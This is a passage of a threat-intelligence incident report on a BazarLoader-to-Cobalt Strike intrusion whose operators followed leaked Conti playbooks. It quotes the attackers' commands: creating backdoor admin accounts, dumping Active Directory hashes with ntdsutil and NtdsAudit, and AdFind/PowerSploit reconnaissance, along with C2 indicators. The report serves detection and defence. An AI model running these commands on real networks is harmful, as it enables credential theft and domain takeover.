	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>								</nav><!-- #site-navigation -->
            			</div>
        				</div><!-- .wrap -->
     				</div><!-- .navigation-top -->
				<div class="clock"> 
					<div id="time"></div>
					<div id="date">Wednesday, December 18, 2024</div>
				</div>
				</div><!-- #nav-sticker -->
				       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			</div><!-- .main-header-brand -->
						
							</div><!-- .main-header -->
	</header><!-- #masthead -->

	<div id="content" class="site-content">
		<div class="site-content-cell">
						<div class="wrap wrap-width">

	<div id="primary" class="content-area">
		<main id="main" class="site-main">

		
<article id="post-4173" class="post-4173 post type-post status-publish format-standard hentry category-adfind category-bazar category-cobaltstrike entry">
	
	<div class="entry-content-holder">
		<header class="entry-header">

		
				<div class="entry-meta">

					
		<span class="cat-links">
		
			<a class="category-color-24" href="https://thedfirreport.com/category/adfind/">adfind</a>
		
			<a class="category-color-27" href="https://thedfirreport.com/category/bazar/">bazar</a>
		
			<a class="category-color-6" href="https://thedfirreport.com/category/cobaltstrike/">cobaltstrike</a>
				</span>
	
				</div><!-- .entry-meta -->
			<h1 class="entry-title">BazarLoader and the Conti Leaks</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/" rel="bookmark"><time class="entry-date published" datetime="2021-10-04T01:30:53+00:00">October 4, 2021</time></a></span>		</div><!-- .entry-meta -->

		
	</header><!-- .entry-header -->

	<div class="entry-content">
		<div class="markdown">
<h3 id="intro">Intro</h3>
<p>In July, we observed an intrusion that started from a BazarLoader infection and lasted approximately three days. The threat actor&#8217;s main priority was to map the domain network, while looking for interesting data to exfiltrate. Their preferred method of operation was through GUI applications such as RDP and AnyDesk.</p>
<p>Historically, BazarLoader was used to deploy Ryuk, as we reported on many <a href="https://thedfirreport.com/category/ryuk/" target="_blank" rel="nofollow noopener">occasions</a>. In one of our <a href="https://thedfirreport.com/2021/09/13/bazarloader-to-conti-ransomware-in-32-hours/" target="_blank" rel="nofollow noopener">latest reports</a>, we saw BazarLoader result in the deployment of Conti ransomware.</p>
<h3 id="case-summary">Case Summary</h3>
<p>In this case, we did not see the exact initial access vector but based on other reports at the time we assess with medium to high confidence a malicious email campaign delivering macro enabled Word documents was the delivery vector. Shortly after the initial BazarLoader execution, we observed the first discovery commands using the standard built in Microsoft utilities (net view, net group, nltest). We saw the BazarLoader process download and execute the first Cobalt Strike beacon twenty minutes later using rundll32.</p>
<p>As the operators tried to enumerate the network, they miss-typed a lot of their commands. During interactive discovery tasks via the Cobalt Strike beacon, the threat actors attempted an unusual command that had us scratching our heads for awhile, &#8220;av_query”. This left us confused, we were not aware of the reason and/or the purpose of this command.</p>
<p>On August 5th, a threat actor that goes with the name &#8220;m1Geelka&#8221;, leaked multiple documents that contained instructions, tools and, &#8220;training&#8221; materials to be used by affiliates of Conti ransomware. We demonstrated some of the documents on one of our recent <a href="https://twitter.com/thedfirreport/status/1423361119926816776?s=21" target="_blank" rel="nofollow noopener">tweet threads</a>, more info about the Conti leak <a href="https://therecord.media/disgruntled-ransomware-affiliate-leaks-the-conti-gangs-technical-manuals/" target="_blank" rel="noopener">here</a>. In these materials, we found a file called &#8220;AVquery.cna&#8221; that refers to a Cobalt Strike aggressor script for <a href="https://github.com/harleyQu1nn/AggressorScripts" target="_blank" rel="nofollow noopener">identifying AV</a> on the target systems. It is likely that the threat actors in this intrusion meant to use this aggressor script via their Cobalt Strike console, but instead typed or pasted “av_query” into their windows command prompt session. Additionally, threat actors were seen following the instructions of the leaked documents step by step. More specifically, we observed the threat actors copy/pasting the exact commands such as creating local admin users that contained the same passwords we saw in the leaked instructions.</p>
<p>Continuing with the discovery phase, the threat actors executed AdFind via a batch script before further enumerating using native Windows tools and port scanning via the Cobalt Strike beacon. They then successfully escalated privileges by dumping credentials from the LSASS process. After having enough situational awareness over the domain and an administrator&#8217;s account in their possession, operators used a reverse proxy and established a RDP connection on the beachhead host. Moments later, we observed them move laterally for the first time to the Domain Controller using RDP. Once on the Domain Controller, they again downloaded and executed AdFind through the same batch script. They also ran two separate Cobalt Strike beacons. As if their presence was not enough with Cobalt Strike and administrator credentials, they proceeded with creating two local administrator accounts.</p>
<p>Next, they installed AnyDesk, a remote access application for RDP connectivity and remote system control. After having four different types of persistence, they felt it was enough and continued enumerating the network, only this time, they searched for valuable documents across all domain-joined hosts. To accomplish that, they used PowerSploit and, more specifically, the &#8220;Invoke-ShareFinder&#8221; module. While waiting for their script to finish, the threat actors created a full backup of active directory in &#8220;IFM&#8221; media mode and dumped the password hashes along with the corresponding users. This method is both stealthier and safer for extracting the hashes from active directory, as explained by <a href="https://www.blackhillsinfosec.com/got-privs-crack-those-hashes/" target="_blank" rel="nofollow noopener">Black Hills Information Security</a>.</p>
<p>The next step for the threat actors was to download and run &#8220;Advanced IP Scanner&#8221; and scanned for ranges looking for other active subnets on the LAN. After four hours of downtime, the operators returned to the network and did something unexpected; they used <a title="enter image title here" href="https://github.com/GhostPack/Seatbelt" target="_blank" rel="nofollow noopener">seatbelt</a> to enumerate the domain controller further. They then pivoted over to another domain controller, repeated all the above discovery steps, and ran the same tools as on the first domain controller.</p>
<p>Eventually, this intrusion ended on the third day from the initial BazarLoader execution. After almost a day of inactivity, the operators logged into the network and used RDP to remote into file servers that contained valuable data. They then created a directory called Shares$ and used <a href="https://rclone.org/" target="_blank" rel="nofollow noopener">Rclone</a> to exfiltrate the data to the <a href="https://mega.io/startpage" target="_blank" rel="nofollow noopener">Mega Fileshare service</a>. Typically, these types of cases end up with <a href="https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/" target="_blank" rel="nofollow noopener">Conti</a> <a href="https://thedfirreport.com/2021/09/13/bazarloader-to-conti-ransomware-in-32-hours/" target="_blank" rel="nofollow noopener">ransomware</a>, however, the threat actors were evicted from the network before a final suspected ransomware deployment commenced.</p>
<h3 id="services">Services</h3>
<p>We offer multiple services including a <a href="https://thedfirreport.com/services/" target="_blank" rel="nofollow noopener">Threat Feed service</a> which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, BazarLoader, etc. More information on this service and others can be found <a href="https://thedfirreport.com/services/" target="_blank" rel="nofollow noopener">here</a>.</p>
<p>Three of the Cobalt Strike servers from this case were added to the Threat Feed on 7/19 and the other two were added on 7/29.</p>
<p>We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our <a href="https://www.patreon.com/thedfirreport" target="_blank" rel="nofollow noopener">Security Researcher and Organization</a> services.</p>
<h3 id="timeline">Timeline</h3>
<p><img fetchpriority="high" decoding="async" class="alignnone size-full wp-image-4263" src="https://thedfirreport.com/wp-content/uploads/2021/10/BazarLoader-and-the-Conti-Leaks_TL.png" alt="" width="1142" height="2785" srcset="https://thedfirreport.com/wp-content/uploads/2021/10/BazarLoader-and-the-Conti-Leaks_TL.png 1142w, https://thedfirreport.com/wp-content/uploads/2021/10/BazarLoader-and-the-Conti-Leaks_TL-123x300.png 123w, https://thedfirreport.com/wp-content/uploads/2021/10/BazarLoader-and-the-Conti-Leaks_TL-420x1024.png 420w, https://thedfirreport.com/wp-content/uploads/2021/10/BazarLoader-and-the-Conti-Leaks_TL-768x1873.png 768w, https://thedfirreport.com/wp-content/uploads/2021/10/BazarLoader-and-the-Conti-Leaks_TL-630x1536.png 630w, https://thedfirreport.com/wp-content/uploads/2021/10/BazarLoader-and-the-Conti-Leaks_TL-840x2048.png 840w" sizes="(max-width: 1142px) 100vw, 1142px" /></p>
</div>
<p>Analysis and reporting completed by <a href="https://twitter.com/Kostastsale" target="_blank" rel="noreferrer noopener">@kostastsale</a></p>
<p>Reviewed by <a href="https://twitter.com/iiamaleks" target="_blank" rel="noreferrer noopener">@iiamaleks</a> and <a href="https://twitter.com/pigerlin" target="_blank" rel="noreferrer noopener">@pigerlin</a></p>
<div class="markdown">
<h3 id="mitre-attck">MITRE ATT&amp;CK</h3>
<h3 id="initial-access">Initial Access</h3>
<p>We assess with medium to high confidence that the initial access was a result of malicious, macro-enabled, Word document that was sent as an attachment to the targets of a phishing campaign.</p>
<p><a href="https://twitter.com/malware_traffic/status/1417905207682510849?s=20" target="_blank" rel="nofollow noopener">Brad</a> reported on similar BazarLoader activity initiated from malicious TA551 Word Doc email campaign that resulted in Cobalt Strike beacons.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/Brads-related-tweet.png"><img decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/Brads-related-tweet.png" alt="enter image description here" width="647" height="654" /></a></p>
<h3 id="execution">Execution</h3>
<p>The initial execution for this intrusion took place with the use of BazarLoader malware via rundll32.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/Bazar-Initial-Execution-Chain.png"><img decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/Bazar-Initial-Execution-Chain.png" alt="enter image description here" width="1290" height="712" /></a></p>
<p>Immediately after the execution, the malware contacted two of its C2 IPs:</p>
<pre><code><span class="hljs-number">35.165</span><span class="hljs-number">.197</span><span class="hljs-number">.209</span>|<span class="hljs-number">443</span> 
<span class="hljs-number">3.101</span><span class="hljs-number">.57</span><span class="hljs-number">.185</span>|<span class="hljs-number">443</span></code></pre>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/Initial-Bazar-C2-comm_0.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/Initial-Bazar-C2-comm_0.png" alt="enter image description here" width="796" height="232" /></a></p>
<p>We then observed the threat actor using the BazarLoader injected process, svchost.exe, to download Cobalt Strike and save it under:</p>
<pre><code>C:\Users\<span class="hljs-tag">&lt;<span class="hljs-title">user</span>&gt;</span>\Appdata\Local\Temp
</code></pre>
<p>before executing it using rundll32.exe.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/Bazar-Downloading-beacon.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/Bazar-Downloading-beacon.png" alt="enter image description here" width="1324" height="205" /></a></p>
<p>Throughout the intrusion, the threat actors utilized Cobalt Strike beacons and PowerShell to execute their payloads prior to interactively remoting into hosts using RDP and AnyDesk.</p>
<h3 id="persistence">Persistence</h3>
<p>The threat actors created two local user accounts on the first Domain Controller. They also added one of the two to the local administrators group. The passwords that they used were the same as the passwords of the recent Conti leaked documents.</p>
<p>Screenshot from leaked Conti data (“Закреп\ AnyDesk.txt”) (<a href="https://twitter.com/TheDFIRReport/status/1423361119926816776" target="_blank" rel="nofollow noopener">our tweet thread on Conti leak manuals</a>):</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/Conti_leaked_data-admin.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/Conti_leaked_data-admin.png" alt="enter image description here" width="375" height="31" /></a></p>
<p>Commands from the intrusion:</p>
<pre><code><span class="hljs-title">net</span> user sqlbackup qc69t4b<span class="hljs-comment">#z0ke3 /add </span>
net user localadmin qc69t4b<span class="hljs-comment">#z0ke3 /add </span>
net localgroup administrators localadmin /add 
</code></pre>
<p>AnyDesk was also installed on the main domain controller.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/5426-1.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/5426-1.png" alt="enter image description here" width="741" height="179" /></a></p>
<p>The threat actors maintained an open communication channel through AnyDesk for a period of 11 hours.</p>
<p>The threat actor was seen logging in from 185.220.100.242 (Tor Exit Node) using AnyDesk. Client ID 776934005. (ad_svc.trace)</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4235" src="https://thedfirreport.com/wp-content/uploads/2021/10/1.png" alt="" width="575" height="141" srcset="https://thedfirreport.com/wp-content/uploads/2021/10/1.png 575w, https://thedfirreport.com/wp-content/uploads/2021/10/1-300x74.png 300w" sizes="auto, (max-width: 575px) 100vw, 575px" /></p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>The threat actors accessed credentials for an administrator account from the LSASS process using the Cobalt Strike beacon. On the image below, we can see that the CS beacon process is injected into LSASS.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/Credential-Access-LSASS.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/Credential-Access-LSASS.png" alt="enter image description here" width="760" height="185" /></a></p>
<h3 id="defense-evasion">Defense Evasion</h3>
<p>Throughout the intrusion, we observed multiple instances of process injection  from both the initial BazarLoader malware and Cobalt Strike beacons.</p>
<p>After BazarLoader was loaded in memory, almost immediately it injected into svchost.exe process. Additionally, the Cobalt Strike beacon was injected into mstsc.exe, searchindexer.exe and rundll32.exe and run various tasks from these processes.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/ProcessInjection-Diagram-small.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/ProcessInjection-Diagram-small.png" alt="enter image description here" width="2000" height="827" /></a></p>
<h3 id="credential-access">Credential Access</h3>
<p>The LSASS process was accessed by an unusual process “searchindexer.exe” on beachhead right before the lateral movement was observed. Searchindexer.exe is a legitimate Windows process responsible for the indexing of files or Windows searches.</p>
<p>This technique is known to be used by Cobaltstrike which inject malicious code into a newly spawned searchindexer process to evade detection. This is associated with MITRE ATT&amp;CK (r) Tactic(s): Defense Evasion and Technique(s): T1036.004.</p>
<p>The Sysmon logs captured in our case below can be used to detect this type of activity.</p>
<pre><code>Sysmon Event ID: <span class="hljs-number">10</span> 
Description: Process Access  
SourceImage: C:\Winows\System32\SearchIndexer.exe 
TargetImage: C:\Windows\system32\lsass.exe 
SourceImage: C:\Winows\System32\SearchIndexer.exe 
TargetImage: C:\Windows\system32\lsass.exe 

GrantedAccess: <span class="hljs-number">0x21410</span> 

CallTrace: C:\Windows\SYSTEM32\ntdll.dll+<span class="hljs-number">9</span>d2e4|C:\Windows\System32\KERNELBASE.dll+<span class="hljs-number">2</span>bcee|C:\Program Files\Common Files\Microsoft Shared\Ink\IpsPlugin.dll+<span class="hljs-number">10369</span>|C:\Program Files\Common Files\Microsoft Shared\Ink\IpsPlugin.dll+<span class="hljs-number">10</span>b65|C:\Program Files\Common Files\Microsoft Shared\Ink\IpsPlugin.dll+<span class="hljs-number">8</span>cb2 
</code></pre>
<p>The threat actors created a full backup of the active directory in &#8220;IFM&#8221; media mode and dumped the password hashes along with the corresponding users.</p>
<pre><code><span class="hljs-title">ntdsutil</span> <span class="hljs-string">"ac in ntds"</span> <span class="hljs-string">"ifm"</span> <span class="hljs-string">"create full c:\windows\temp\crashpad\x"</span> q q 
</code></pre>
<p>They also employed the NtdsAudit tool immediately after using NTDSutil to dump the password hashes of all domain users. NtdsAudit requires the &#8220;ntds.dit&#8221; database file and SYSTEM registry file for extracting the password hashes and usernames. After providing these as arguments, they exported the password hashes in a file that they named &#8220;pwdump.txt&#8221; and the user details in a csv file called &#8220;users.csv&#8221;. After obtaining the password hashes, the threat actors can crack the passwords hashes using a program such as hashcat.</p>
<pre>ntdsAudit.exe ntds.dit -s SYSTEM -p pwddump.txt -u users.csv</pre>
<h3 id="discovery">Discovery</h3>
<p>A few minutes after the initial execution, BazarLoader ran some discovery tasks using the built in Microsoft net and nltest utilities and transferred the results over the C2 channel.</p>
<pre><code><span class="hljs-keyword">net</span> view /<span class="hljs-literal">all</span>  
<span class="hljs-keyword">net</span> view /<span class="hljs-literal">all</span> /domain  
<span class="hljs-keyword">nltest</span> /domain_trusts /all_trusts  
<span class="hljs-keyword">net</span> localgroup <span class="hljs-string">"administrator"</span> (comment: command mistyped)  
<span class="hljs-keyword">net</span> group <span class="hljs-string">"domain admins"</span> /dom 
</code></pre>
<p>Later on, hands-on operators carried out some additional network and domain reconnaissance from the Cobalt Strike beacon. Again, built in utilities were favored, with the exception of what we assess was a fat finger or miss-paste by the threat actor entering a command they meant to execute in their Cobalt Strike console into the windows command terminal.</p>
<pre><code>ipconfig /all  
nltest /dclist  
net <span class="hljs-keyword">group</span> <span class="hljs-string">"Domain Admins"</span> /<span class="hljs-function">dom  
tasklist  
<span class="hljs-title">av_query</span>  (<span class="hljs-params">comment: Not a valid command</span>) 
net  localgroup <span class="hljs-title">Administrateurs</span> (<span class="hljs-params">comment: French translation of the named <span class="hljs-keyword">group</span> administrators</span>) 
net localgroup Administrators 
SYSTEMINFO </span></code></pre>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/Initial_discovery_cmds.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/Initial_discovery_cmds.png" alt="enter image description here" width="1542" height="511" /></a></p>
<p>The threat actors executed AdFind multiple times on both the beachhead and the domain controllers through a well-known script called adf.bat.</p>
<pre><code>adfind.exe <span class="hljs-operator">-f</span> <span class="hljs-string">"(objectcategory=person)"</span>  
adfind.exe <span class="hljs-operator">-f</span> <span class="hljs-string">"objectcategory=computer"</span>  
adfind.exe <span class="hljs-operator">-f</span> <span class="hljs-string">"(objectcategory=organizationalunit)"</span>  
adfind.exe -sc trustdmp  
adfind.exe -subnets <span class="hljs-operator">-f</span> (objectcategory=subnet)  
adfind.exe <span class="hljs-operator">-f</span> <span class="hljs-string">"(objectcategory=group)"</span>  
adfind.exe -gcb -sc trustdmp 
</code></pre>
<p>Later on, during the first day of the intrusion, and before we saw the threat actors pivot laterally to the domain controller, they ensured the information that they had collected was accurate by running the below enumeration commands:</p>
<pre><code>net <span class="hljs-operator"><span class="hljs-keyword">use</span>  
ipconfig /all  
netstat -ano  
net <span class="hljs-keyword">group</span> <span class="hljs-string">"domain admins"</span> /<span class="hljs-keyword">domain</span>  
net <span class="hljs-keyword">view</span> "<span class="hljs-keyword">Domain</span> Controller <span class="hljs-keyword">name"</span>  
net <span class="hljs-keyword">view</span> "<span class="hljs-keyword">Second</span> <span class="hljs-keyword">Domain</span> Controller <span class="hljs-keyword">name"</span>
ping "<span class="hljs-keyword">Domain</span> Controller IP"
ping "<span class="hljs-keyword">Domain</span> Controller <span class="hljs-keyword">name"</span>
ping "<span class="hljs-keyword">Second</span> <span class="hljs-keyword">Domain</span> Controller <span class="hljs-keyword">name"</span>
ping "<span class="hljs-keyword">Domain</span> Controller IPv6"
echo %%username%%  
arp -a  
<span class="hljs-keyword">time</span>  
<span class="hljs-built_in">date</span></span></code></pre>
<p>Threat actor dropped and ran a script named ping.bat. Here&#8217;s an example:</p>
<pre>ping -n 1 hostname &gt;&gt; C:\programdata\log.txt
ping -n 1 hostname2 &gt;&gt; C:\programdata\log.txt
ping -n 1 hostname3 &gt;&gt; C:\programdata\log.txt</pre>
<p>The threat actors utilized Advanced IP Scanner to the scan for open ports.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/Advanced_IP_scanner-exec.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/Advanced_IP_scanner-exec.png" alt="enter image description here" width="1839" height="140" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/Port_scanning.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/Port_scanning.png" alt="enter image description here" width="459" height="257" /></a></p>
<p>One of the first things that the attackers did once on the first domain controller, was to execute Invoke-ShareFinder from <a href="https://github.com/PowerShellMafia/PowerSploit/tree/d943001a7defb5e0d1657085a77a0e78609be58f" target="_blank" rel="nofollow noopener">PowerSploit</a> via PowerShell ISE. They did the same thing later, on the second domain controller.</p>
<pre><code><span class="hljs-string">"Command"</span>: <span class="hljs-string">"Get-NetCurrentUser"</span> 
<span class="hljs-string">"Command"</span>: <span class="hljs-string">"Get-NetDomain"</span> 
<span class="hljs-string">"Command"</span>: <span class="hljs-string">"Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\shares.txt"</span></code></pre>
<p>Other Microsoft AD management PowerShell administration modules were also invoked by the threat actors for discovery tasks.</p>
<pre><code>Get-ADDomainController
Get-ADDomainController -Filter * | ft
Get-ADComputer -Filter <span class="hljs-bullet">* -Properties *</span> | Get-Member
Get-ADDomain</code></pre>
<p>From the Domain Controller the threat actor also ran a <a href="https://github.com/GhostPack/Seatbelt" target="_blank" rel="noopener">Seatbelt</a> binary, which was also seen in the Conti leak documents. This utility contains a number of &#8220;safety checks&#8221; on a host, telling the user about things like installed AV, network drives, local users, and much more.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/5426-3.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4182" src="https://thedfirreport.com/wp-content/uploads/2021/09/5426-3.png" alt="" width="441" height="301" srcset="https://thedfirreport.com/wp-content/uploads/2021/09/5426-3.png 441w, https://thedfirreport.com/wp-content/uploads/2021/09/5426-3-300x205.png 300w" sizes="auto, (max-width: 441px) 100vw, 441px" /></a></p>
<p>We also noticed the threat actors searching for any existing antivirus software on the domain controller. They ran &#8220;dir&#8221; on the &#8220;c:\Program Files\&#8221; folder and saved the findings in the AV.txt file using a script named av.bat The script looked similar to the below:</p>
<pre>dir "\\hostname\c$\Program Files\* &gt;&gt; C:\programdata\AV.txt
dir "\\hostname2\c$\Program Files\* &gt;&gt; C:\programdata\AV.txt
dir "\\hostname3\c$\Program Files\* &gt;&gt; C:\programdata\AV.txt</pre>
<h3 id="lateral-movement">Lateral Movement</h3>
<p>Many hours after the initial compromise, we observed the threat actors using RDP to connect to the first domain controller. They used reverse proxy via the Cobalt Strike C2 to initiate the RDP connection and for that reason, the operator’s real hostname was captured in event ID 4624:</p>
<p><img decoding="async" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/RDP_comm_4624-EID.png" alt="enter image description here" /></p>
<h3 id="collection">Collection</h3>
<p>Prior to exfiltrating the data, operators staged them under a directory called &#8220;Shares&#8221; on each file server. They then inspected the documents they collected prior to exfiltrating them over to Mega storage servers using the <a href="https://rclone.org/" target="_blank" rel="noopener">Rclone</a> application.</p>
<h3 id="command-and-control">Command and Control</h3>
<p>BazarLoader initial communication with the C2 is over HTTPS. Data is sent to the C2 via the cookie parameter(screenshot taken from <a href="https://tria.ge/210716-v4jh8hf6ea/behavioral2)" target="_blank" rel="nofollow noopener">https://tria.ge/210716-v4jh8hf6ea/behavioral2)</a>.</p>
<p><img decoding="async" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/Initial-Bazar-C2-comm.png" alt="enter image description here" /></p>
<p>Twenty minutes after the initial execution, BazarLoader downloaded and executed Cobalt Strike beacon with the help of rundll32.exe.</p>
<p>The AnyDesk software installed by the threat actors maintained a constant connection to the Anydesk infrastructure for the duration of the intrusion.</p>
<p>AnyDesk:</p>
<pre><code><span class="hljs-number">143.244</span><span class="hljs-number">.61</span><span class="hljs-number">.217</span>:<span class="hljs-number">443</span>
JA3: c91bde19008eefabce276152ccd51457
JA3s: <span class="hljs-number">107030</span>a763c7224285717ff1569a17f3
Certificate: [<span class="hljs-number">18</span>:<span class="hljs-number">42</span>:fd:a1:<span class="hljs-number">39</span>:<span class="hljs-number">29</span>:<span class="hljs-number">33</span>:<span class="hljs-number">47</span>:<span class="hljs-number">44</span>:<span class="hljs-number">65</span>:bc:a2:d6:<span class="hljs-number">73</span>:a8:c5:c9:<span class="hljs-number">35</span>:<span class="hljs-number">9</span>a:f3 ]
Not Before: <span class="hljs-number">2014</span>/<span class="hljs-number">04</span>/<span class="hljs-number">11</span> <span class="hljs-number">02</span>:<span class="hljs-number">37</span>:<span class="hljs-number">55</span> UTC 
Not After: <span class="hljs-number">2024</span>/<span class="hljs-number">04</span>/<span class="hljs-number">08</span> <span class="hljs-number">02</span>:<span class="hljs-number">37</span>:<span class="hljs-number">55</span> UTC 
Issuer Org: philandro Software GmbH 
Subject Common: anynet root ca 
Subject Org: philandro Software GmbH 
Public Algorithm: rsaEncryption 

Certificate: [<span class="hljs-number">9</span>e:<span class="hljs-number">08</span>:d2:<span class="hljs-number">58</span>:a9:<span class="hljs-number">02</span>:cd:<span class="hljs-number">4f</span>:e2:<span class="hljs-number">4</span>a:<span class="hljs-number">26</span>:b8:<span class="hljs-number">48</span>:<span class="hljs-number">5</span>c:<span class="hljs-number">43</span>:<span class="hljs-number">0</span>b:<span class="hljs-number">81</span>:<span class="hljs-number">29</span>:<span class="hljs-number">99</span>:e3 ]
Not Before: <span class="hljs-number">2018</span>/<span class="hljs-number">11</span>/<span class="hljs-number">18</span> <span class="hljs-number">02</span>:<span class="hljs-number">14</span>:<span class="hljs-number">23</span> UTC 
Not After: <span class="hljs-number">2028</span>/<span class="hljs-number">11</span>/<span class="hljs-number">15</span> <span class="hljs-number">02</span>:<span class="hljs-number">14</span>:<span class="hljs-number">23</span> UTC 
Issuer Org: philandro Software GmbH 
Subject Common: anynet relay 
Subject Org: philandro Software GmbH 
Public Algorithm: id-ecPublicKey Curveprime256v1
</code></pre>
<p>Some network oddities appeared several times during the course of the intrusion. One of those oddities was several connections across the intrusion to an XMPP chat server at chatterboxtown.us at 70.35.205.161. These connections originated from one of the Cobalt Strike processes over port 5222. The goal of this traffic was not discovered in the course of the investigation.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/5426-2.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4178" src="https://thedfirreport.com/wp-content/uploads/2021/09/5426-2.png" alt="" width="857" height="378" srcset="https://thedfirreport.com/wp-content/uploads/2021/09/5426-2.png 857w, https://thedfirreport.com/wp-content/uploads/2021/09/5426-2-300x132.png 300w, https://thedfirreport.com/wp-content/uploads/2021/09/5426-2-768x339.png 768w" sizes="auto, (max-width: 857px) 100vw, 857px" /></a></p>
<p>Another, was a brief SSH connection to a server on the internet using Putty.</p>
<p><img decoding="async" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/SSH-IP_censys-info.png" alt="enter image description here" /></p>
<p>The connection took place for a period of twenty minutes. The reason for this connection is unknown. According to public records, the IP is associated with an old Cobalt Strike C2 server.</p>
<p>BazarLoader:</p>
<pre><code><span class="hljs-number">35.165</span><span class="hljs-number">.197</span><span class="hljs-number">.209</span>:<span class="hljs-number">443</span>
JA3: <span class="hljs-number">72</span>a589da586844d7f0818ce684948eea
JA3s: e35df3e00ca4ef31d42b34bebaa2f86e
